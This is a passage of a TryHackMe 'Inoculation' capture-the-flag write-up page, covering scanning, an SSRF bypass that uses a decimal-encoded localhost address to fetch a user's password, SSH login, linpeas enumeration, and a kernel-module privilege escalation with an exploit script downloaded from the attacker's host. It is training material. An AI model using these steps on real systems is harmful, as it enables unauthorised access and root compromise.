@@ -1,0 +1,654 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Inoculation | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Inoculation TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/inoculation/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/inoculation/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Inoculation"><meta property="og:description" content="Inoculation TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/inoculation/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Inoculation"><meta name=twitter:description content="Inoculation TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Inoculation","item":"https://s4ch.github.io/writeups/tryhackme/inoculation/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Inoculation","name":"Inoculation","description":"Inoculation TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Designed to introduce less common concepts\nInoculation\n💢 We will cover the topics Network Enumeration Web Enumeration Web Poking Misconfigured Binaries Kernal Exploitation Obtain root Want a challenge? Here you go…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 kali@kali:~/CTFs/tryhackme/Inoculation$ sudo nmap -A -sC -sV -p- -O --script vuln 10.10.153.127 [sudo] password for kali: Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 19:30 CEST Pre-scan script results: | broadcast-avahi-dos: | Discovered hosts: | 224.0.0.251 | After NULL UDP avahi packet DoS (CVE-2011-1002). |_ Hosts are all up (not vulnerable). Nmap scan report for 10.10.153.127 Host is up (0.035s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) | vulners: | cpe:/a:openbsd:openssh:7.2p2: | CVE-2008-3844 9.3 https://vulners.com/cve/CVE-2008-3844 | CVE-2016-8858 7.8 https://vulners.com/cve/CVE-2016-8858 | CVE-2016-6515 7.8 https://vulners.com/cve/CVE-2016-6515 | CVE-2016-10009 7.5 https://vulners.com/cve/CVE-2016-10009 | CVE-2016-10012 7.2 https://vulners.com/cve/CVE-2016-10012 | CVE-2015-8325 7.2 https://vulners.com/cve/CVE-2015-8325 | CVE-2016-10010 6.9 https://vulners.com/cve/CVE-2016-10010 | CVE-2019-6111 5.8 https://vulners.com/cve/CVE-2019-6111 | CVE-2018-15919 5.0 https://vulners.com/cve/CVE-2018-15919 | CVE-2018-15473 5.0 https://vulners.com/cve/CVE-2018-15473 | CVE-2017-15906 5.0 https://vulners.com/cve/CVE-2017-15906 | CVE-2016-10708 5.0 https://vulners.com/cve/CVE-2016-10708 | CVE-2019-16905 4.4 https://vulners.com/cve/CVE-2019-16905 | CVE-2016-6210 4.3 https://vulners.com/cve/CVE-2016-6210 | CVE-2007-2768 4.3 https://vulners.com/cve/CVE-2007-2768 | CVE-2019-6110 4.0 https://vulners.com/cve/CVE-2019-6110 | CVE-2019-6109 4.0 https://vulners.com/cve/CVE-2019-6109 | CVE-2014-9278 4.0 https://vulners.com/cve/CVE-2014-9278 | CVE-2018-20685 2.6 https://vulners.com/cve/CVE-2018-20685 |_ CVE-2016-10011 2.1 https://vulners.com/cve/CVE-2016-10011 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_clamav-exec: ERROR: Script execution failed (use -d to debug) | http-csrf: | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.153.127 | Found the following possible CSRF vulnerabilities: | | Path: http://10.10.153.127:80/ | Form id: hook |_ Form action: testhook.php |_http-dombased-xss: Couldn't find any DOM based XSS. |_http-server-header: Apache/2.4.18 (Ubuntu) | http-slowloris-check: | VULNERABLE: | Slowloris DOS attack | State: LIKELY VULNERABLE | IDs: CVE:CVE-2007-6750 | Slowloris tries to keep many connections to the target web server open and hold | them open as long as possible. It accomplishes this by opening connections to | the target web server and sending a partial request. By doing so, it starves | the http server's resources causing Denial Of Service. | | Disclosure date: 2009-09-17 | References: | http://ha.ckers.org/slowloris/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 | http-sql-injection: | Possible sqli for queries: | http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=S%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/fonts/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/fonts/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/fonts/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/fonts/?C=N%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/images/?C=D%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/images/?C=N%3bO%3dD%27%20OR%20sqlspider | http://10.10.153.127:80/assets/images/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/images/?C=M%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider | http://10.10.153.127:80/assets/?C=M%3bO%3dD%27%20OR%20sqlspider |_ http://10.10.153.127:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider |_http-stored-xss: Couldn't find any stored XSS vulnerabilities. | vulners: | Apache httpd 2.4.18: | HTTPD:F564BBA32AA088833DA032B7EB77CA29 7.5 https://vulners.com/httpd/HTTPD:F564BBA32AA088833DA032B7EB77CA29 | HTTPD:E74D6161229FA3D00A1783E6C3426C5D 7.5 https://vulners.com/httpd/HTTPD:E74D6161229FA3D00A1783E6C3426C5D | HTTPD:C7D2DA1ACB016A5220CA8E74647BED26 7.5 https://vulners.com/httpd/HTTPD:C7D2DA1ACB016A5220CA8E74647BED26 | HTTPD:8F00FB1DD7567228376803FEDB0EC3B6 7.5 https://vulners.com/httpd/HTTPD:8F00FB1DD7567228376803FEDB0EC3B6 | HTTPD:7EEE138FD834328B3FC98E4B7FCAD266 7.5 https://vulners.com/httpd/HTTPD:7EEE138FD834328B3FC98E4B7FCAD266 | HTTPD:24E96D438275A8177C289509C796525C 7.5 https://vulners.com/httpd/HTTPD:24E96D438275A8177C289509C796525C | HTTPD:237FAB5DE739A612077A245192137A48 7.5 https://vulners.com/httpd/HTTPD:237FAB5DE739A612077A245192137A48 | HTTPD:143F3A43D871E3AFFF956DB1049A6A2A 7.5 https://vulners.com/httpd/HTTPD:143F3A43D871E3AFFF956DB1049A6A2A | HTTPD:0C6EE30D77005EBF2B39E351B1F3E2C4 7.5 https://vulners.com/httpd/HTTPD:0C6EE30D77005EBF2B39E351B1F3E2C4 | HTTPD:FC354B921BA807DFCACD7CD3C1D02FF9 7.2 https://vulners.com/httpd/HTTPD:FC354B921BA807DFCACD7CD3C1D02FF9 | HTTPD:9CDB89FBD1162B1E462FDF5BEA375759 6.8 https://vulners.com/httpd/HTTPD:9CDB89FBD1162B1E462FDF5BEA375759 | HTTPD:13B5FCC9676077F8FD08063C83511140 6.8 https://vulners.com/httpd/HTTPD:13B5FCC9676077F8FD08063C83511140 | HTTPD:B057D0A07B0AC97248CE6210E08ACAF7 6.4 https://vulners.com/httpd/HTTPD:B057D0A07B0AC97248CE6210E08ACAF7 | HTTPD:99188FFDCAF9C4932D00C218A2E58EC7 6.4 https://vulners.com/httpd/HTTPD:99188FFDCAF9C4932D00C218A2E58EC7 | HTTPD:531CF2A74E1A5A02A1D6AE2505AD586F 6.4 https://vulners.com/httpd/HTTPD:531CF2A74E1A5A02A1D6AE2505AD586F | HTTPD:1696C4DDCBC58CE20005FCB002958C09 6.0 https://vulners.com/httpd/HTTPD:1696C4DDCBC58CE20005FCB002958C09 | HTTPD:BC81F521379C9038153151EAA84492CA 5.8 https://vulners.com/httpd/HTTPD:BC81F521379C9038153151EAA84492CA | HTTPD:01BB9C701A4D4302EF59FA7EA89D9115 5.8 https://vulners.com/httpd/HTTPD:01BB9C701A4D4302EF59FA7EA89D9115 | HTTPD:F292DF1CEE1729E4240D1D62A10F5D32 5.1 https://vulners.com/httpd/HTTPD:F292DF1CEE1729E4240D1D62A10F5D32 | HTTPD:CE14FA5A5B1A2BE3A35EA809C9D8CFF7 5.1 https://vulners.com/httpd/HTTPD:CE14FA5A5B1A2BE3A35EA809C9D8CFF7 | HTTPD:79096CA36FAE041205EFAB66A6D4EF4B 5.1 https://vulners.com/httpd/HTTPD:79096CA36FAE041205EFAB66A6D4EF4B | HTTPD:E91F31FD116386F2922B3EDA4BE3899B 5.0 https://vulners.com/httpd/HTTPD:E91F31FD116386F2922B3EDA4BE3899B | HTTPD:E05CACB9D575871BA1E3088D02930266 5.0 https://vulners.com/httpd/HTTPD:E05CACB9D575871BA1E3088D02930266 | HTTPD:D7BF4648C333C0F770A30DEB0A23601C 5.0 https://vulners.com/httpd/HTTPD:D7BF4648C333C0F770A30DEB0A23601C | HTTPD:D5609C15618DCADFDAD5AD396F2B83D7 5.0 https://vulners.com/httpd/HTTPD:D5609C15618DCADFDAD5AD396F2B83D7 | HTTPD:D5091608B1DC5DB5CABE405261B7658E 5.0 https://vulners.com/httpd/HTTPD:D5091608B1DC5DB5CABE405261B7658E | HTTPD:D26626D944F16D90B877FB157E4A128F 5.0 https://vulners.com/httpd/HTTPD:D26626D944F16D90B877FB157E4A128F | HTTPD:D0D55654F7429E8A4965CBBE30779CD6 5.0 https://vulners.com/httpd/HTTPD:D0D55654F7429E8A4965CBBE30779CD6 | HTTPD:C191D6FAD0C97D0A2E0A2A9F7BFE6B38 5.0 https://vulners.com/httpd/HTTPD:C191D6FAD0C97D0A2E0A2A9F7BFE6B38 | HTTPD:BD5F2FE0FF24D28F3450C11422A68AC8 5.0 https://vulners.com/httpd/HTTPD:BD5F2FE0FF24D28F3450C11422A68AC8 | HTTPD:B2B68FFCE0FB45D09BE91EE9ECBA07F6 5.0 https://vulners.com/httpd/HTTPD:B2B68FFCE0FB45D09BE91EE9ECBA07F6 | HTTPD:A5459AF02C9EC35CE80EA173C36C3F47 5.0 https://vulners.com/httpd/HTTPD:A5459AF02C9EC35CE80EA173C36C3F47 | HTTPD:99477914E1BE8FA85CEA0E956232C4C2 5.0 https://vulners.com/httpd/HTTPD:99477914E1BE8FA85CEA0E956232C4C2 | HTTPD:824D39D8A30F1234C966CBDA41E1C446 5.0 https://vulners.com/httpd/HTTPD:824D39D8A30F1234C966CBDA41E1C446 | HTTPD:73656ED41609146303D488C86337BC2D 5.0 https://vulners.com/httpd/HTTPD:73656ED41609146303D488C86337BC2D | HTTPD:6CAC4F8B58BB2BE168795A6BA0CA26A1 5.0 https://vulners.com/httpd/HTTPD:6CAC4F8B58BB2BE168795A6BA0CA26A1 | HTTPD:5D6E315A1B98558C0DF8CBE51264FBA5 5.0 https://vulners.com/httpd/HTTPD:5D6E315A1B98558C0DF8CBE51264FBA5 | HTTPD:4EC9662496A151DDE6D030D9127572E7 5.0 https://vulners.com/httpd/HTTPD:4EC9662496A151DDE6D030D9127572E7 | HTTPD:42FA2547862AB3B3F5E7F776E2D90614 5.0 https://vulners.com/httpd/HTTPD:42FA2547862AB3B3F5E7F776E2D90614 | HTTPD:3647863A8E4AE972669D5EE60974E777 5.0 https://vulners.com/httpd/HTTPD:3647863A8E4AE972669D5EE60974E777 | HTTPD:18105DABC6D0ADE97D12B90F63EAE025 5.0 https://vulners.com/httpd/HTTPD:18105DABC6D0ADE97D12B90F63EAE025 | HTTPD:174A0D44882BCA7E2F229BC91D6D5A09 5.0 https://vulners.com/httpd/HTTPD:174A0D44882BCA7E2F229BC91D6D5A09 | HTTPD:04C30566E99EFB3C0D60F08EE2524591 5.0 https://vulners.com/httpd/HTTPD:04C30566E99EFB3C0D60F08EE2524591 | HTTPD:FF57290724543D4766EDDC4666992FE8 4.3 https://vulners.com/httpd/HTTPD:FF57290724543D4766EDDC4666992FE8 | HTTPD:F4FBBB7467F08F96828B98E753E5FE7D 4.3 https://vulners.com/httpd/HTTPD:F4FBBB7467F08F96828B98E753E5FE7D | HTTPD:D94ACD37B5627A621B2D592BD44873F2 4.3 https://vulners.com/httpd/HTTPD:D94ACD37B5627A621B2D592BD44873F2 | HTTPD:D26FFC4C8AA598C5F130A0223836644E 4.3 https://vulners.com/httpd/HTTPD:D26FFC4C8AA598C5F130A0223836644E | HTTPD:A5773ECB3CB67826707B252F21BB80BB 4.3 https://vulners.com/httpd/HTTPD:A5773ECB3CB67826707B252F21BB80BB | HTTPD:86C509FC37A85DC3C01E3CE10402C6DC 4.3 https://vulners.com/httpd/HTTPD:86C509FC37A85DC3C01E3CE10402C6DC | HTTPD:714A18409AEB3B8362DC4FA2B923CA7A 4.3 https://vulners.com/httpd/HTTPD:714A18409AEB3B8362DC4FA2B923CA7A | HTTPD:43E63F90DCA6F418ACF2327C4F88C3D8 4.3 https://vulners.com/httpd/HTTPD:43E63F90DCA6F418ACF2327C4F88C3D8 | HTTPD:2E568217BC35E0AA91DF49E7CE65CA67 3.5 https://vulners.com/httpd/HTTPD:2E568217BC35E0AA91DF49E7CE65CA67 | HTTPD:B6CF5630624F83951A477D36DC8FD634 0.0 https://vulners.com/httpd/HTTPD:B6CF5630624F83951A477D36DC8FD634 | HTTPD:94C27BCF50CA81A222019B9F06735AA1 0.0 https://vulners.com/httpd/HTTPD:94C27BCF50CA81A222019B9F06735AA1 | HTTPD:914D0BB6DF64CDA58BDF1461563DCBC2 0.0 https://vulners.com/httpd/HTTPD:914D0BB6DF64CDA58BDF1461563DCBC2 | HTTPD:7ED2E94FC8175AF57B0B84C966E78986 0.0 https://vulners.com/httpd/HTTPD:7ED2E94FC8175AF57B0B84C966E78986 | HTTPD:55F8C86BB4FE80544B301C6F772E1F21 0.0 https://vulners.com/httpd/HTTPD:55F8C86BB4FE80544B301C6F772E1F21 | HTTPD:53F7D531D201D0209EE31F3FA8829F5B 0.0 https://vulners.com/httpd/HTTPD:53F7D531D201D0209EE31F3FA8829F5B |_ HTTPD:21A860C56B7B6A55960FB17E72B7E4B4 0.0 https://vulners.com/httpd/HTTPD:21A860C56B7B6A55960FB17E72B7E4B4 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=10/5%OT=22%CT=1%CU=42760%PV=Y%DS=2%DC=T%G=Y%TM=5F7B59D OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11 OS:NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN( OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 199/tcp) HOP RTT ADDRESS 1 34.94 ms 10.8.0.1 2 35.17 ms 10.10.153.127 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 404.17 seconds http://10.10.153.127/ http://10.10.153.127/testhook.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kali@kali:~/CTFs/tryhackme/Inoculation$ nikto -h 10.10.153.127- Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.153.127 + Target Hostname: 10.10.153.127 + Target Port: 80 + Start Time: 2020-10-05 19:39:50 (GMT2) --------------------------------------------------------------------------- + Server: Apache/2.4.18 (Ubuntu) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) + Server may leak inodes via ETags, header found with file /, inode: 430, size: 5916605783d6d, mtime: gzip + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST + OSVDB-3233: /icons/README: Apache default file found. + 7890 requests: 0 error(s) and 7 item(s) reported on remote host + End Time: 2020-10-05 19:45:56 (GMT2) (366 seconds) --------------------------------------------------------------------------- + 1 host(s) tested Going from 127.0.0.1 to 2130706433, and back again handler=http%3A%2F%2F2130706433%3A§\nhttp://127.0.0.1:9999/pass4maynard.txt\nUsername: maynard\nHere is your password: Js\u0026S_uFJgg~YM4_g\\n\nJs\u0026S_uFJgg~YM4_g\nUser Flag? 1 2 3 4 5 6 7 kali@kali:~/CTFs/tryhackme/Inoculation$ ssh maynard@10.10.153.127 The authenticity of host '10.10.153.127 (10.10.153.127)' can't be established. ECDSA key fingerprint is SHA256:uvVRz1YTEzN+fnnk2hDshR+Pl18TZzbGGRIH6dRtdL8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.153.127' (ECDSA) to the list of known hosts. maynard@10.10.153.127's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic x86_64) 1 2 3 4 5 maynard@inoculation:~$ ls user.txt maynard@inoculation:~$ cat user.txt e7cdb6964dd72a0ef9a934e111d3ed65 maynard@inoculation:~$ e7cdb6964dd72a0ef9a934e111d3ed65\nRoot Flag? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 [+] Searching ssl/ssh files Port 22 PermitRootLogin yes PubkeyAuthentication yes PermitEmptyPasswords no ChallengeResponseAuthentication no UsePAM yes Possible private SSH keys were found! /home/maynard/.config/lxc/client.key --\u003e /etc/hosts.allow file found, read the rules: /etc/hosts.allow ====================================( Interesting Files )===================================== [+] SUID - Check easy privesc, exploits and write perms [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid /usr/bin/chfn ---\u003e SuSE_9.3/10 /usr/bin/passwd ---\u003e Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) /usr/bin/newuidmap /usr/bin/newgidmap /usr/bin/gpasswd /usr/bin/chsh /usr/bin/at ---\u003e RTru64_UNIX_4.0g(CVE-2002-1614) /usr/bin/pkexec ---\u003e Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) /usr/bin/newgrp ---\u003e HP-UX_10.20 /usr/bin/sudo ---\u003e /sudo$ /usr/lib/openssh/ssh-keysign /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/lib/snapd/snap-confine /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /bin/umount ---\u003e BSD/Linux(08-1996) /bin/ping6 /bin/su /bin/fusermount /bin/ntfs-3g ---\u003e Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017) /bin/mount ---\u003e Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 /bin/ping [+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data -rw-r--r-- 1 root root 2188 Aug 31 2015 /etc/bash.bashrc -rw-r--r-- 1 root root 3771 Aug 31 2015 /etc/skel/.bashrc -rw-r--r-- 1 root root 655 May 16 2017 /etc/skel/.profile ./linpeas.sh: 2490: [: /etc/systemd/system/timers.target.wants/snapd.snap-repair.timer: unexpected operator -rw-r--r-- 1 maynard maynard 3771 Aug 31 2019 /home/maynard/.bashrc ./linpeas.sh: 2490: [: /home/maynard/.profile: unexpected operator -rw-r--r-- 1 root root 3106 Oct 22 2015 /usr/share/base-files/dot.bashrc -rw-r--r-- 1 root root 3161 Apr 14 2016 /usr/share/byobu/profiles/bashrc -rw-r--r-- 1 root root 870 Jul 2 2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc -rw-r--r-- 1 root root 1865 Jul 2 2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc 1 2 3 4 5 6 7 8 9 maynard@inoculation:~$ sudo -l sudo: unable to resolve host inoculation Matching Defaults entries for maynard on inoculation: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User maynard may run the following commands on inoculation: (ALL) NOPASSWD: /sbin/insmod (ALL) NOPASSWD: /sbin/rmmod maynard@inoculation:~$ ntfs-3g (Debian 9) - Local Privilege Escalation 1 2 3 4 5 6 7 obj-m += cve_2017_0358.o all: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules clean: make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean 1 2 3 4 5 6 7 obj-m += cve_2017_0358.o all: make -C /lib/modules/4.15.0-58-generic/build M=$(PWD) modules clean: make -C /lib/modules/4.15.0-58-generic/build M=$(PWD) clean 1 2 3 4 5 6 7 8 9 10 maynard@inoculation:~$ wget http://10.8.106.222/41240.sh --2020-10-05 13:43:16-- http://10.8.106.222/41240.sh Connecting to 10.8.106.222:80... connected. HTTP request sent, awaiting response... 200 OK Length: 16102 (16K) [text/x-sh] Saving to: ‘41240.sh’ 41240.sh 100%[=====\u003e] 15.72K --.-KB/s in 0.04s 2020-10-05 13:43:16 (441 KB/s) - ‘41240.sh’ saved [16102/16102] 1 maynard@inoculation:~$ chmod +x 41240.sh ","wordCount":"1665","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/inoculation/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav 